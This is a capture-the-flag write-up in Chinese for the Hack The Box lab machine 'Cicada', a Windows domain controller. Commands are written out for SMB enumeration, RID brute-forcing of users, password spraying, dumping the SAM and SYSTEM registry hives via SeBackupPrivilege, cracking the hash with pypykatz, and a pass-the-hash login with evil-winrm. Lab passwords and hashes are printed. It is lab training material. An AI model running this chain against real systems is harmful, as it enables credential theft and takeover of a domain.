nmap
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-15 17:50:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
64465/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-15T17:51:34
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.47 seconds

```

透過 smbmap 得知匿名訪問可以訪問 HR 跟 IPC＄（不知道為甚麼我的 smbmap 一定要用雙引號才能讓他執行）
```
![image](https://hackmd.io/_uploads/HkFrKZMqke.png)

```
![image](https://hackmd.io/_uploads/rJDyK-fc1g.png)

因為有發現他有開啟 445 先去列舉有沒有可以匿名訪問的檔案 `smbclient -L //10.10.11.35/ -N`
![image](https://hackmd.io/_uploads/By9flgG5ye.png)

在 HR 裡面找到一個 txt file 把他 download 下來（中間有空格的要用雙引號框起來）
```
smbclient //10.10.11.35/HR -N 

get "Notice from HR.txt"
```
![image](https://hackmd.io/_uploads/S1mmZef91x.png)

下載後去讀取文件可以在裡面發現有 password `Cicada$M6Corpb*@Lp#nZp!8`
![image](https://hackmd.io/_uploads/BJpvjlG9Je.png)

現在有了密碼但是沒有帳號 所以我們要去爆破 username 
這邊使用 nxc 來幫忙(crackmapexec, impacket-lookupsid 也可以辦到)
加上 `--rid-brute` 可以把所有的 SID 都列出來 這裡再搭配 grep 只列出 SidTypeUser 就好
```
username 可以隨便打 密碼記得留空

nxc smb 10.10.11.35 -u guest -p '' --rid-brute --continue-on-success | grep -i 'sidtypeuser' 
```
![image](https://hackmd.io/_uploads/r1We3gG9kx.png)

把列出的 username 存成 txt 去爆破密碼，可以發現密碼是對應到 michael.wrightson
![image](https://hackmd.io/_uploads/S12WVZG91x.png)

一樣用 smbmap 得知他還可以訪問 NETLOGON 跟 SYSVOL
![image](https://hackmd.io/_uploads/BysNKbG9kg.png)

但是沒有在裡頭發現有用的東西    

我們已經有一組身分了 那這次改用有身分的帳號去列舉 user 不像是剛剛是用匿名用戶列舉

第一種方法 ：

```
ncx smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```
從資訊中可以看到 david.orelious 有一組密碼為 aRt$Lp#7t*VQ!3
![image](https://hackmd.io/_uploads/B1OcnZGcJx.png)

---

第二種方法 ：
使用 enum4linux-ng 去列舉，這個會想辦法把所有找的到的資訊都抓出來
```
enum4linux-ng -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35 -t 10
```

![image](https://hackmd.io/_uploads/Sy_TZMGqkg.png)


從 smbmap 中可以看到他具有瀏覽 DEV 的權限
![image](https://hackmd.io/_uploads/BkPf6ZGqyl.png)

在裡頭找到一個 `Backup_script.ps1` 的文件
![image](https://hackmd.io/_uploads/HyL3RZG51e.png)

讀取後得到 emily.oscars 的 password `Q!3@Lp#M6b*7t*Vt` 並且看起來就很像可以透過 wimrm 去連線他
![image](https://hackmd.io/_uploads/HJfk1GG5ke.png)

使用 evil-winrm 連線後成功在桌面找到 flag `980d4671c8321a83557314106796f430`
```
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```
![image](https://hackmd.io/_uploads/rJ0lZMf91e.png)

## 提權
成功連線後先看具有哪些權限 可以使用 `whoami /priv` 或是 `whoami /all`
![image](https://hackmd.io/_uploads/ryuD5aG5yl.png)

可以看到我們在 backup 的 group 裡以及 具有 SeBackupPrivilege 和 SeRestorePrivilege 的權限
具有 SeBackupPrivilege 代表有讀設定檔的權限，而 SeRestorePrivilege 則是具有寫的權限

那這時候我們就可以去讀取 SAM（Security Accounts Manager）文件，裡頭會有 admin 的 hash 可以拿來利用
可以參考以下兩篇關於 SeBackupPrivilege 提權的文章 [1](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) [2](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md)

第一步在 `C:/` 中創立 temp 資料夾把 hklm 中的 sam 以及 system 資料導出到 temp 資料夾中
```
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

再把他們都下載下來 system 檔案比較大 會跑比較久
```
download sam
download system
```

使用 pypykatz 成功爆破出 admin 的 hash `2b87e7c93a3e8a0ea4a581937016f341`
```
pypykatz registry --sam sam system
```

![image](https://hackmd.io/_uploads/Bkaadzm5kg.png)


使用 evil-winrm 去登入 記得參數要用 -H 因為是帶入他的 hash
```
evil-winrm -i 10.10.11.35 -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
```

成功登入並在 Desktop 找到 root flag 
![image](https://hackmd.io/_uploads/HkrqtGmckx.png)

結束～
![image](https://hackmd.io/_uploads/SJ3PYfm51g.png)
